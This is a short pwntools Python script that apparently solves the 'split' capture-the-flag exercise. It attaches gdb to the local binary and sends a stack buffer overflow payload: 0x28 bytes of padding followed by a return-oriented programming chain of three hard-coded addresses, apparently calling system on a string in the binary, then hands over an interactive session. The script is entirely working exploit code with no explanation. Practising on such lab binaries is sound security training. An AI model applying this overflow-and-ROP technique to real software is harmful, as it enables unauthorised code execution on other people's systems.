from pwn import *
p = process("./split")
gdb.attach(p, 'b *pwnme+89')

p.sendline(b"A"*0x28 + p64(0x4007c3) + p64(0x601060) + p64(0x40074b))
p.interactive()
